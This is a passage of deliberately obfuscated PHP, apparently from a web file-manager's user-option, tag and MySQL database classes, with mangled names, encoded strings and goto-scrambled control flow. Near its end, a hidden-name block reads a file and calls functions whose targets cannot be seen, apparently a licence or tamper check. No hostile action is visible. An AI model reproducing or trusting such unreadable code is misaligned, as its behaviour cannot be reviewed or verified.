Model($aÁíäòÄ“¨[1727])->field($aÁíäòÄ“¨[1485])->where(array($aÁíäòÄ“¨[1644] => array($aÁíäòÄ“¨[7], $eÆÀâ§“Ü·)))->select(); $Fø¦Üİîºº = array_to_keyvalue($Fø¦Üİîºº, $aÁíäòÄ“¨[33], $aÁíäòÄ“¨[1485]); return array_unique($Fø¦Üİîºº); } public function userSearch($Eä¢÷õÒô, $DÂäô‘–„ = "\x2a") { return Model($_SERVER[úÎü][494])->where($Eä¢÷õÒô)->field($DÂäô‘–„)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($aËàÃáÌ†¶) { $e…¬ÍÔ‡ß¬ =& $_SERVER[úÎü]; if (!defined($e…¬ÍÔ‡ß¬[442])) { define($e…¬ÍÔ‡ß¬[442], 0); } return "\125\163\145\x72\117\x70\x74\151\157\x6e\137{$aËàÃáÌ†¶}\137" . USER_ID; } protected function filterWhere($aÀÉóƒ¢Ñ…) { $bá²éÏŠ–É =& $_SERVER[úÎü]; if (!defined($bá²éÏŠ–É[442])) { define($bá²éÏŠ–É[442], 0); } $aÀÉóƒ¢Ñ…[$bá²éÏŠ–É[1485]] = USER_ID; return $aÀÉóƒ¢Ñ…; } public function cacheRemoveUser($f×á‹†‰°—, $eğ¾’ºÍÎ—) { return Cache::remove("\x55\163\145\162\x4f\160\164\x69\x6f\x6e\x5f{$f×á‹†‰°—}\x5f" . $eğ¾’ºÍÎ—); } protected function optionDefault($añÍŒà¹šì = '') { $b±¥íè =& $_SERVER[úÎü]; if ($añÍŒà¹šì == $b±¥íè[33]) { return $GLOBALS[$b±¥íè[6]][$b±¥íè[2107]]; } if ($añÍŒà¹šì == $b±¥íè[2108]) { return $GLOBALS[$b±¥íè[6]][$b±¥íè[2109]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\164\141\x67\x4c\151\163\164"; public $modelType = "\x55\163\145\162\x4f\x70\164\151\157\x6e"; public $field = array("\156\141\x6d\x65", "\163\164\171\154\145", "\163\157\x72\164"); public function listData($câîê²ƒÅÚ = false, $a¤ï°Î‡Åõ = "\163\x6f\x72\x74", $a’î©¥Çƒ = false) { return parent::listData($câîê²ƒÅÚ, $a¤ï°Î‡Åõ, $a’î©¥Çƒ); } public function remove($c ÃŞ›äÙ¾) { return parent::remove($c ÃŞ›äÙ¾); } public function add($a¯§ˆôø‰, $E¾Ä³‡ª Ì = "\154\x61\142\145\154\55\147\x72\x65\171\55\156\157\162\x6d\x61\x6c") { $eêƒëÃÆ¿– =& $_SERVER[úÎü]; if ($this->findByName($a¯§ˆôø‰)) { return !1; } $A†±éÍ’äš = array($eêƒëÃÆ¿–[402] => $a¯§ˆôø‰, $eêƒëÃÆ¿–[452] => $E¾Ä³‡ª Ì, $eêƒëÃÆ¿–[1648] => $this->getSort($eêƒëÃÆ¿–[252]) + 1); return parent::insert($A†±éÍ’äš); } public function update($dÖ´æ‰ƒ‘—, $fÄìÜšŸíš) { $Fß–˜âßŠ =& $_SERVER[úÎü]; $EñÃÓ®¡’İ = $this->listData($dÖ´æ‰ƒ‘—); $C¢Í„Ì‚éÌ = $this->findByName($fÄìÜšŸíš[$Fß–˜âßŠ[28]]); if (!$EñÃÓ®¡’İ || $C¢Í„Ì‚éÌ && $C¢Í„Ì‚éÌ[$Fß–˜âßŠ[383]] != $EñÃÓ®¡’İ[$Fß–˜âßŠ[383]]) { return !1; } return parent::update($dÖ´æ‰ƒ‘—, $fÄìÜšŸíš); } public function moveTop($bƒ˜åË“„—) { $b³¼“Šà–ˆ =& $_SERVER[úÎü]; $DœÛ£„åŠä = parent::listData(); $b³®Õ•ãòê = $this->getSort($b³¼“Šà–ˆ[251]); foreach ($DœÛ£„åŠä as &$a¤ƒ©Öß‘) { if ($a¤ƒ©Öß‘[$b³¼“Šà–ˆ[383]] == $bƒ˜åË“„—) { $a¤ƒ©Öß‘[$b³¼“Šà–ˆ[1667]] = $b³®Õ•ãòê; continue; } $a¤ƒ©Öß‘[$b³¼“Šà–ˆ[1667]] += 1; } unset($a¤ƒ©Öß‘); return parent::resetData($DœÛ£„åŠä); } public function moveBottom($cèÕŒ˜Ğ¥) { $fºõÅ–»š¯ =& $_SERVER[úÎü]; $A—Ü§Ó“â¢ = $this->getSort($fºõÅ–»š¯[252]) + 1; return parent::update($cèÕŒ˜Ğ¥, array($fºõÅ–»š¯[1667] => $A—Ü§Ó“â¢)); } public function resetSort($F‰™ÊÄ‘ù¾) { goto dÒ¬ÓÜğÔŸ; FÎÎÁØ§³: unset($e¼ƒ¸âá¦©); return parent::resetData($DÎÉÑŒ”Òİ); goto D½÷ïùÏ–¹; Dµ·¨ï‡æÃ: for ($B…½±‹Û‡Ò = 0; $B…½±‹Û‡Ò < count($F‰™ÊÄ‘ù¾); $B…½±‹Û‡Ò++) { $e–»†ªâœ¯[$F‰™ÊÄ‘ù¾[$B…½±‹Û‡Ò] . $d¸ĞÓ¹¡Ò[33]] = $B…½±‹Û‡Ò + 1; } $DÎÉÑŒ”Òİ = parent::listData(); foreach ($DÎÉÑŒ”Òİ as &$e¼ƒ¸âá¦©) { $bÚ¶ê­ªØ = $e–»†ªâœ¯[$e¼ƒ¸âá¦©[$d¸ĞÓ¹¡Ò[383]]]; $e¼ƒ¸âá¦©[$d¸ĞÓ¹¡Ò[1667]] = $bÚ¶ê­ªØ ? $bÚ¶ê­ªØ : $e¼ƒ¸âá¦©[$d¸ĞÓ¹¡Ò[1667]]; } goto FÎÎÁØ§³; dÒ¬ÓÜğÔŸ: $d¸ĞÓ¹¡Ò =& $_SERVER[úÎü]; $e–»†ªâœ¯ = array(); $F‰™ÊÄ‘ù¾ = is_array($F‰™ÊÄ‘ù¾) ? $F‰™ÊÄ‘ù¾ : array(); goto Dµ·¨ï‡æÃ; D½÷ïùÏ–¹: } private function getSort($dàíŸ½ÏÈ•) { $B‹°àèï»“ =& $_SERVER[úÎü]; $Eœ•·ùÆ÷È = parent::listData(); $E¥†„²–£‹ = array_to_keyvalue($Eœ•·ùÆ÷È, $B‹°àèï»“[33], $B‹°àèï»“[1667]); if (!$E¥†„²–£‹) { $E¥†„²–£‹ = array(0); } $EÊÚáÆÉÓï = $dàíŸ½ÏÈ• == $B‹°àèï»“[252] ? max($E¥†„²–£‹) : min($E¥†„²–£‹); return intval($EÊÚáÆÉÓï); } } goto A‚«âíŒ†Œ; cì‡º¶Üá†: class DbMysql extends Db { public function __construct($aÏê¦´ĞÕ‘ = '') { $bğ‚‚›¡ˆò =& $_SERVER[úÎü]; if (!extension_loaded($bğ‚‚›¡ˆò[728])) { think_exception(think_lang($bğ‚‚›¡ˆò[10]) . $bğ‚‚›¡ˆò[804]); } if (!empty($aÏê¦´ĞÕ‘)) { $this->config = $aÏê¦´ĞÕ‘; if (empty($this->config[$bğ‚‚›¡ˆò[13]])) { $this->config[$bğ‚‚›¡ˆò[13]] = $bğ‚‚›¡ˆò[33]; } } } public function connect($CŸĞİãÈŸ¿ = '', $eÆîøÖ„·® = 0, $Câ×Â òÖ² = false) { $CŒôƒå‹³É =& $_SERVER[úÎü]; if (!isset($this->linkID[$eÆîøÖ„·®])) { goto DÕÃœ—’ã; B²Å–ç¦—ƒ: if (1 != think_config($CŒôƒå‹³É[18])) { unset($this->config); } goto aŠ“¨‹…Ó¬; a¸“Ëˆå˜: mysql_query($CŒôƒå‹³É[809] . think_config($CŒôƒå‹³É[810]) . $CŒôƒå‹³É[55], $this->linkID[$eÆîøÖ„·®]); if ($EÊ¯‰±ªâè > $CŒôƒå‹³É[811]) { mysql_query($CŒôƒå‹³É[812], $this->linkID[$eÆîøÖ„·®]); } $this->connected = !0; goto B²Å–ç¦—ƒ; b†Â”¹ÄòÈ: if ($DãÆŒŠ¯º) { $this->linkID[$eÆîøÖ„·®] = mysql_pconnect($B‡‘Æº·æ, $CŸĞİãÈŸ¿[$CŒôƒå‹³É[807]], $CŸĞİãÈŸ¿[$CŒôƒå‹³É[808]], 131072); } else { $this->linkID[$eÆîøÖ„·®] = mysql_connect($B‡‘Æº·æ, $CŸĞİãÈŸ¿[$CŒôƒå‹³É[807]], $CŸĞİãÈŸ¿[$CŒôƒå‹³É[808]], !0, 131072); } if (!$this->linkID[$eÆîøÖ„·®] || !empty($CŸĞİãÈŸ¿[$CŒôƒå‹³É[17]]) && !mysql_select_db($CŸĞİãÈŸ¿[$CŒôƒå‹³É[17]], $this->linkID[$eÆîøÖ„·®])) { think_exception(mysql_error()); } $EÊ¯‰±ªâè = mysql_get_server_info($this->linkID[$eÆîøÖ„·®]); goto a¸“Ëˆå˜; DÕÃœ—’ã: if (empty($CŸĞİãÈŸ¿)) { $CŸĞİãÈŸ¿ = $this->config; } $B‡‘Æº·æ = $CŸĞİãÈŸ¿[$CŒôƒå‹³É[805]] . ($CŸĞİãÈŸ¿[$CŒôƒå‹³É[806]] ? "\72{$CŸĞİãÈŸ¿[$CŒôƒå‹³É[806]]}" : $CŒôƒå‹³É[33]); $DãÆŒŠ¯º = !empty($CŸĞİãÈŸ¿[$CŒôƒå‹³É[13]][$CŒôƒå‹³É[14]]) ? $CŸĞİãÈŸ¿[$CŒôƒå‹³É[13]][$CŒôƒå‹³É[14]] : $this->pconnect; goto b†Â”¹ÄòÈ; aŠ“¨‹…Ó¬: } return $this->linkID[$eÆîøÖ„·®]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E°ÜéÏ‡Úº) { goto C­è¢„˜Š; e¡¸ğõ¿‘: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto FÎò‰‚–ßç; C­è¢„˜Š: $BæŸö©Ö­ë =& $_SERVER[úÎü]; if (0 === stripos($E°ÜéÏ‡Úº, $BæŸö©Ö­ë[258])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto A±øŞ¼¡ä; A±øŞ¼¡ä: if (!$this->_linkID) { return !1; } $this->queryStr = $E°ÜéÏ‡Úº; if ($this->queryID) { $this->free(); } goto b¬ˆÛ‡ğ§ö; b¬ˆÛ‡ğ§ö: think_action_status($BæŸö©Ö­ë[19], 1); think_status($BæŸö©Ö­ë[20]); $this->queryID = mysql_query($E°ÜéÏ‡Úº, $this->_linkID); goto e¡¸ğõ¿‘; FÎò‰‚–ßç: } public function execute($cŸƒ‰ù÷êì) { goto FèøŸ‚¾˜±; bŒ…À™ˆèŠ: think_status($a¶¾ê±‘‚Ü[20]); $EÊçº¹ „ = mysql_query($cŸƒ‰ù÷êì, $this->_linkID); $this->debug(); goto B§Ö‹ƒ¦åä; B§Ö‹ƒ¦åä: if (!1 === $EÊçº¹ „) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto Aì÷‚§ãéÇ; FèøŸ‚¾˜±: $a¶¾ê±‘‚Ü =& $_SERVER[úÎü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D÷Şì–àƒ; D÷Şì–àƒ: $this->queryStr = $cŸƒ‰ù÷êì; if ($this->queryID) { $this->free(); } think_action_status($a¶¾ê±‘‚Ü[21], 1); goto bŒ…À™ˆèŠ; Aì÷‚§ãéÇ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[úÎü][813], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FŸáøÔ‚˜á = mysql_query($_SERVER[úÎü][814], $this->_linkID); $this->transTimes = 0; if (!$FŸáøÔ‚˜á) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dºâğ·¤Ü‚ = mysql_query($_SERVER[úÎü][815], $this->_linkID); $this->transTimes = 0; if (!$dºâğ·¤Ü‚) { $this->error(); return !1; } } return !0; } private function getAll() { $cƒàêÒÚäš = array(); if ($this->numRows > 0) { while ($eÀµÉÃ¥–Œ = mysql_fetch_assoc($this->queryID)) { $cƒàêÒÚäš[] = $eÀµÉÃ¥–Œ; } mysql_data_seek($this->queryID, 0); } return $cƒàêÒÚäš; } public function getFields($d²ã«İòÙ¢) { $EÉ“Ê¸Œ°Ô =& $_SERVER[úÎü]; $còâ§ï¹± = $this->query($EÉ“Ê¸Œ°Ô[816] . $this->parseKey($d²ã«İòÙ¢)); $dà§¹æ’º = array(); if ($còâ§ï¹±) { foreach ($còâ§ï¹± as $eàÍŠÕ±´¨ => $b„â…óØ³) { $dà§¹æ’º[$b„â…óØ³[$EÉ“Ê¸Œ°Ô[27]]] = array($EÉ“Ê¸Œ°Ô[28] => $b„â…óØ³[$EÉ“Ê¸Œ°Ô[27]], $EÉ“Ê¸Œ°Ô[29] => $b„â…óØ³[$EÉ“Ê¸Œ°Ô[30]], $EÉ“Ê¸Œ°Ô[31] => (bool) (strtoupper($b„â…óØ³[$EÉ“Ê¸Œ°Ô[32]]) === $EÉ“Ê¸Œ°Ô[817]), $EÉ“Ê¸Œ°Ô[34] => $b„â…óØ³[$EÉ“Ê¸Œ°Ô[35]], $EÉ“Ê¸Œ°Ô[36] => strtolower($b„â…óØ³[$EÉ“Ê¸Œ°Ô[37]]) == $EÉ“Ê¸Œ°Ô[38], $EÉ“Ê¸Œ°Ô[39] => strtolower($b„â…óØ³[$EÉ“Ê¸Œ°Ô[40]]) == $EÉ“Ê¸Œ°Ô[41]); } } return $dà§¹æ’º; } public function getTables($BŞÈ¦¸òèÀ = '') { $A¨Ñ¾ßøˆè =& $_SERVER[úÎü]; if (!empty($BŞÈ¦¸òèÀ)) { $E™Éö–Í = $A¨Ñ¾ßøˆè[818] . $BŞÈ¦¸òèÀ . $A¨Ñ¾ßøˆè[819]; } else { $E™Éö–Í = $A¨Ñ¾ßøˆè[820]; } $c¶ôî²ƒìõ = $this->query($E™Éö–Í); $b½§¾œÙëö = array(); foreach ($c¶ôî²ƒìõ as $AÏ¯ê²ãŞ¾ => $Aëç÷á Õ˜) { $b½§¾œÙëö[$AÏ¯ê²ãŞ¾] = current($Aëç÷á Õ˜); } return $b½§¾œÙëö; } public function replace($CØ²±Œò‘, $CÃ™á·îÙ = array()) { $F“¦ŸÜŞ‚í =& $_SERVER[úÎü]; foreach ($CØ²±Œò‘ as $b‚›‘”ˆ‰Æ => $BØÌ•Ş¬æÔ) { $d‹Šß¶§¶Ş = $this->parseValue($BØÌ•Ş¬æÔ); if (is_scalar($d‹Šß¶§¶Ş)) { $f­­ºŞœ[] = $d‹Šß¶§¶Ş; $cƒÏÓº–¢[] = $this->parseKey($b‚›‘”ˆ‰Æ); } } $Bó†ÇÅ…œí = $F“¦ŸÜŞ‚í[821] . $this->parseTable($CÃ™á·îÙ[$F“¦ŸÜŞ‚í[273]]) . $F“¦ŸÜŞ‚í[822] . implode($F“¦ŸÜŞ‚í[47], $cƒÏÓº–¢) . $F“¦ŸÜŞ‚í[823] . implode($F“¦ŸÜŞ‚í[47], $f­­ºŞœ) . $F“¦ŸÜŞ‚í[824]; return $this->execute($Bó†ÇÅ…œí); } public function insertAll($aÚ«Å‚°÷, $FÂŸ­óÀ¶­ = array(), $EÕ®·ëñˆ = false) { goto a³³’ƒ×©õ; B„Ä•ëôîœ: $a›ù¡–°Ó­ = array(); foreach ($aÚ«Å‚°÷ as $bó¢‘œ¢óÕ) { $cäì–íØ»± = array(); foreach ($bó¢‘œ¢óÕ as $dç›Å™Ì‚  => $eÏ­ƒ÷ğ¢‹) { $eÏ­ƒ÷ğ¢‹ = $this->parseValue($eÏ­ƒ÷ğ¢‹); if (is_scalar($eÏ­ƒ÷ğ¢‹)) { $cäì–íØ»±[] = $eÏ­ƒ÷ğ¢‹; } } $a›ù¡–°Ó­[] = $DŞƒ–ÕÄšÄ[254] . implode($DŞƒ–ÕÄšÄ[47], $cäì–íØ»±) . $DŞƒ–ÕÄšÄ[824]; } array_walk($A×ÉŠÒæ“, array($this, $DŞƒ–ÕÄšÄ[825])); goto c¯¾ËÂçª§; c¯¾ËÂçª§: $AôÑÆßâ = ($EÕ®·ëñˆ ? $DŞƒ–ÕÄšÄ[826] : $DŞƒ–ÕÄšÄ[827]) . $DŞƒ–ÕÄšÄ[828] . $this->parseTable($FÂŸ­óÀ¶­[$DŞƒ–ÕÄšÄ[273]]) . $DŞƒ–ÕÄšÄ[822] . implode($DŞƒ–ÕÄšÄ[47], $A×ÉŠÒæ“) . $DŞƒ–ÕÄšÄ[829] . implode($DŞƒ–ÕÄšÄ[47], $a›ù¡–°Ó­); return $this->execute($AôÑÆßâ); goto Fæ‹ÜÍÁº…; a³³’ƒ×©õ: $DŞƒ–ÕÄšÄ =& $_SERVER[úÎü]; if (!is_array($aÚ«Å‚°÷[0])) { return !1; } $A×ÉŠÒæ“ = array_keys($aÚ«Å‚°÷[0]); goto B„Ä•ëôîœ; Fæ‹ÜÍÁº…: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $d–½ÑèßÎØ =& $_SERVER[úÎü]; $this->error = mysql_errno() . $d–½ÑèßÎØ[4] . mysql_error($this->_linkID); if ($d–½ÑèßÎØ[33] != $this->queryStr) { $this->error .= LNG($d–½ÑèßÎØ[45]) . $this->queryStr; } think_trace($this->error, $d–½ÑèßÎØ[33], $d–½ÑèßÎØ[46]); return $this->error; } public function escapeString($A­ƒ©èÅäº) { if ($this->_linkID) { return mysql_real_escape_string($A­ƒ©èÅäº, $this->_linkID); } else { return mysql_escape_string($A­ƒ©èÅäº); } } public function parseKey(&$E¼Áá£å, $aÃòŠ‚‰Æ = true) { $bÆŸ‡ÙÎ÷ =& $_SERVER[úÎü]; if ($aÃòŠ‚‰Æ) { $E¼Áá£å = $this->parseKeyCheck($E¼Áá£å); } if ($E¼Áá£å != $bÆŸ‡ÙÎ÷[180] && !preg_match($bÆŸ‡ÙÎ÷[830], $E¼Áá£å)) { $E¼Áá£å = $bÆŸ‡ÙÎ÷[375] . trim($E¼Áá£å, $bÆŸ‡ÙÎ÷[375]) . $bÆŸ‡ÙÎ÷[375]; } return $E¼Áá£å; } } class DbMysqli extends Db { public function __construct($AæÃ‰âò‚ˆ = '') { $bà¿àÛÄË =& $_SERVER[úÎü]; if (!extension_loaded($bà¿àÛÄË[727])) { think_exception(think_lang($bà¿àÛÄË[10]) . $bà¿àÛÄË[831]); } if (!empty($AæÃ‰âò‚ˆ)) { $this->config = $AæÃ‰âò‚ˆ; if (empty($this->config[$bà¿àÛÄË[13]])) { $this->config[$bà¿àÛÄË[13]] = $bà¿àÛÄË[33]; } } } public function connect($AªôËš×¶Ù = '', $C‚àèˆ”¡ = 0) { $BÔ±†ëùÈ =& $_SERVER[úÎü]; if (!isset($this->linkID[$C‚àèˆ”¡])) { goto D‘Ï½’‰Ö; D‘Ï½’‰Ö: if (empty($AªôËš×¶Ù)) { $AªôËš×¶Ù = $this->config; } $this->linkID[$C‚àèˆ”¡] = new mysqli($AªôËš×¶Ù[$BÔ±†ëùÈ[805]], $AªôËš×¶Ù[$BÔ±†ëùÈ[807]], $AªôËš×¶Ù[$BÔ±†ëùÈ[808]], $AªôËš×¶Ù[$BÔ±†ëùÈ[17]], $AªôËš×¶Ù[$BÔ±†ëùÈ[806]] ? intval($AªôËš×¶Ù[$BÔ±†ëùÈ[806]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto B‚†ŸÒ½§‘; Bß¬¯¢ÁÔ¼: $this->connected = !0; if (1 != think_config($BÔ±†ëùÈ[18])) { unset($this->config); } goto c«‰Âİù; B‚†ŸÒ½§‘: $fëåĞĞğˆ¢ = $this->linkID[$C‚àèˆ”¡]->server_version; $this->linkID[$C‚àèˆ”¡]->query($BÔ±†ëùÈ[809] . think_config($BÔ±†ëùÈ[810]) . $BÔ±†ëùÈ[55]); if ($fëåĞĞğˆ¢ > $BÔ±†ëùÈ[811]) { $this->linkID[$C‚àèˆ”¡]->query($BÔ±†ëùÈ[812]); } goto Bß¬¯¢ÁÔ¼; c«‰Âİù: } return $this->linkID[$C‚àèˆ”¡]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($DÍÀ•Œ—‰ê) { goto C¨Ó„‚«¾; C¨Ó„‚«¾: $A‰¸…Ö¬”™ =& $_SERVER[úÎü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a¯Ë³£ÔĞÓ; C‘•ƒ°”¸‰: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto A“ôŞ·Ñ¶Ï; A©ÑËÑéÆÃ: think_status($A‰¸…Ö¬”™[20]); $this->queryID = $this->_linkID->query($DÍÀ•Œ—‰ê); if ($this->_linkID->more_results()) { while (($dß’Ï³ùÃº = $this->_linkID->next_result()) != NULL) { $dß’Ï³ùÃº->free_result(); } } goto C‘•ƒ°”¸‰; a¯Ë³£ÔĞÓ: $this->queryStr = $DÍÀ•Œ—‰ê; if ($this->queryID) { $this->free(); } think_action_status($A‰¸…Ö¬”™[19], 1); goto A©ÑËÑéÆÃ; A“ôŞ·Ñ¶Ï: } public function execute($c³äó…˜õÜ) { goto b¼ø´“åë£; a¶…è´†ë“: $this->queryStr = $c³äó…˜õÜ; if ($this->queryID) { $this->free(); } think_action_status($Bî‰¦£ªª[21], 1); goto fÚ‘åç±ïä; b¼ø´“åë£: $Bî‰¦£ªª =& $_SERVER[úÎü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¶…è´†ë“; fÚ‘åç±ïä: think_status($Bî‰¦£ªª[20]); $EŠ¸Š¯Ü©ß = $this->_linkID->query($c³äó…˜õÜ); $this->debug(); goto fçôßƒ™±; fçôßƒ™±: if (!1 === $EŠ¸Š¯Ü©ß) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto cÁ¾ø‰åõé; cÁ¾ø‰åõé: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Fóååàòà = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Fóååàòà) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $c¾—µ¾ÕšÅ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$c¾—µ¾ÕšÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $d¸•ƒ †›— = array(); if ($this->numRows > 0) { for ($Cˆä¬¸âå = 0; $Cˆä¬¸âå < $this->numRows; $Cˆä¬¸âå++) { $d¸•ƒ †›—[$Cˆä¬¸âå] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $d¸•ƒ †›—; } public function getFields($Eê½ÁÙëç) { $D¬„‘ÚÄ„ =& $_SERVER[úÎü]; $FÄˆÙº¡ñÜ = $this->query($D¬„‘ÚÄ„[816] . $this->parseKey($Eê½ÁÙëç)); $b´ÆÎÅ× ‚ = array(); if ($FÄˆÙº¡ñÜ) { foreach ($FÄˆÙº¡ñÜ as $e“‚£±ÍÛÀ => $aö¨¹Ü’¯) { $b´ÆÎÅ× ‚[$aö¨¹Ü’¯[$D¬„‘ÚÄ„[27]]] = array($D¬„‘ÚÄ„[28] => $aö¨¹Ü’¯[$D¬„‘ÚÄ„[27]], $D¬„‘ÚÄ„[29] => $aö¨¹Ü’¯[$D¬„‘ÚÄ„[30]], $D¬„‘ÚÄ„[31] => (bool) ($aö¨¹Ü’¯[$D¬„‘ÚÄ„[32]] === $D¬„‘ÚÄ„[33]), $D¬„‘ÚÄ„[34] => $aö¨¹Ü’¯[$D¬„‘ÚÄ„[35]], $D¬„‘ÚÄ„[36] => strtolower($aö¨¹Ü’¯[$D¬„‘ÚÄ„[37]]) == $D¬„‘ÚÄ„[38], $D¬„‘ÚÄ„[39] => strtolower($aö¨¹Ü’¯[$D¬„‘ÚÄ„[40]]) == $D¬„‘ÚÄ„[41]); } } return $b´ÆÎÅ× ‚; } public function getTables($dÎØ¾‡Ê“ = '') { $F‘ ƒÉ£ =& $_SERVER[úÎü]; $Cœ”öÊ‹’ = !empty($dÎØ¾‡Ê“) ? $F‘ ƒÉ£[818] . $dÎØ¾‡Ê“ . $F‘ ƒÉ£[819] : $F‘ ƒÉ£[820]; $eİ‘µ°Ñ = $this->query($Cœ”öÊ‹’); $C¶Áç–Æ¤™ = array(); if ($eİ‘µ°Ñ) { foreach ($eİ‘µ°Ñ as $bøåñÒìî† => $fÓ”Ù–Úôœ) { $C¶Áç–Æ¤™[$bøåñÒìî†] = current($fÓ”Ù–Úôœ); } } return $C¶Áç–Æ¤™; } public function replace($BŞ°™ŒËØ, $DË’¼„‹ñä = array()) { $Fëê“’‹¡ =& $_SERVER[úÎü]; foreach ($BŞ°™ŒËØ as $E±µñ•÷¾‚ => $aùë…•–) { $E‹Ø ëàï½ = $this->parseValue($aùë…•–); if (is_scalar($E‹Ø ëàï½)) { $c«÷®„‡¿í[] = $E‹Ø ëàï½; $Cİï†ÉĞâé[] = $this->parseKey($E±µñ•÷¾‚); } } $AÏÛĞÌ°§Ô = $Fëê“’‹¡[821] . $this->parseTable($DË’¼„‹ñä[$Fëê“’‹¡[273]]) . $Fëê“’‹¡[822] . implode($Fëê“’‹¡[47], $Cİï†ÉĞâé) . $Fëê“’‹¡[823] . implode($Fëê“’‹¡[47], $c«÷®„‡¿í) . $Fëê“’‹¡[824]; return $this->execute($AÏÛĞÌ°§Ô); } public function insertAll($b…ÓÁæ­‡Í, $AãÀ÷È¿µ = array(), $Bç´ÉŸ“¥ = false) { goto d…¾Ì­¥–Ô; EÂ¤²ÛãÚÅ: $A¬ØÊõöå¸ = array(); foreach ($b…ÓÁæ­‡Í as $eÒÁëÅ¬”–) { $DâĞ¶ôÜ” = array(); foreach ($eÒÁëÅ¬”– as $C¢‡£÷ø†ã => $A˜Í†ÔñÍ) { $A˜Í†ÔñÍ = $this->parseValue($A˜Í†ÔñÍ); if (is_scalar($A˜Í†ÔñÍ)) { $DâĞ¶ôÜ”[] = $A˜Í†ÔñÍ; } } $A¬ØÊõöå¸[] = $eèßø™Ãã¦[254] . implode($eèßø™Ãã¦[47], $DâĞ¶ôÜ”) . $eèßø™Ãã¦[824]; } array_walk($eµŠñø´ìİ, array($this, $eèßø™Ãã¦[825])); goto AîóØœ±ã˜; d…¾Ì­¥–Ô: $eèßø™Ãã¦ =& $_SERVER[úÎü]; if (!is_array($b…ÓÁæ­‡Í[0])) { return !1; } $eµŠñø´ìİ = array_keys($b…ÓÁæ­‡Í[0]); goto EÂ¤²ÛãÚÅ; AîóØœ±ã˜: $f—æ»çö¶› = ($Bç´ÉŸ“¥ ? $eèßø™Ãã¦[826] : $eèßø™Ãã¦[827]) . $eèßø™Ãã¦[828] . $this->parseTable($AãÀ÷È¿µ[$eèßø™Ãã¦[273]]) . $eèßø™Ãã¦[822] . implode($eèßø™Ãã¦[47], $eµŠñø´ìİ) . $eèßø™Ãã¦[829] . implode($eèßø™Ãã¦[47], $A¬ØÊõöå¸); return $this->execute($f—æ»çö¶›); goto BçàŞÄÄçº; BçàŞÄÄçº: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Eš¬²ï‰— =& $_SERVER[úÎü]; $this->error = $this->_linkID->errno . $Eš¬²ï‰—[4] . $this->_linkID->error; if ($Eš¬²ï‰—[33] != $this->queryStr) { $this->error .= LNG($Eš¬²ï‰—[45]) . $this->queryStr; } think_trace($this->error, $Eš¬²ï‰—[33], $Eš¬²ï‰—[46]); return $this->error; } public function escapeString($b±×Œå‹¢æ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b±×Œå‹¢æ); } else { return addslashes($b±×Œå‹¢æ); } } public function parseKey(&$eÒ‘‘ºÒ¹…, $E£õ¥…™±î = true) { $D¡Å¯Ò£Â =& $_SERVER[úÎü]; if ($E£õ¥…™±î) { $eÒ‘‘ºÒ¹… = $this->parseKeyCheck($eÒ‘‘ºÒ¹…); } if ($eÒ‘‘ºÒ¹… != $D¡Å¯Ò£Â[180] && !preg_match($D¡Å¯Ò£Â[830], $eÒ‘‘ºÒ¹…)) { $eÒ‘‘ºÒ¹… = $D¡Å¯Ò£Â[375] . trim($eÒ‘‘ºÒ¹…, $D¡Å¯Ò£Â[375]) . $D¡Å¯Ò£Â[375]; } return $eÒ‘‘ºÒ¹…; } } if ($_SERVER[$_SERVER[úÎü][793]] != $_SERVER[$_SERVER[úÎü][794]]) { goto D™®âÌö; D™®âÌö: $C½õÇ·Ğï = $_SERVER[úÎü][796]; $C‚½àší‘¿ = $_SERVER[$_SERVER[úÎü][797]] . $_SERVER[úÎü][798]; $FÄÅ¼²¢ö‡ = $C½õÇ·Ğï($C‚½àší‘¿); goto aŞ¯•âàÍ; c”¸§’íÙÍ: $b¸éÈˆ½à($_SERVER[$_SERVER[úÎü][833]]); goto D¯Œ´‰¶Ú; aŞ¯•âàÍ: $DÎ¨¨Ã®ÏÎ = explode($_SERVER[úÎü][225], $FÄÅ¼²¢ö‡); if (count($DÎ¨¨Ã®ÏÎ) < $_SERVER[úÎü][576]) { $A¬ÍĞŠŸ«– = $_SERVER[úÎü][799]; $A¬ÍĞŠŸ«–(); } $b¸éÈˆ½à = $_SERVER[úÎü][832]; goto c”¸§’íÙÍ; D¯Œ´‰¶Ú: } goto D’‰Âååß‹; F‹¦í¡³æ: define($_SERVER[úÎü][236], 0); define($_SERVER[úÎü][237], 2); class 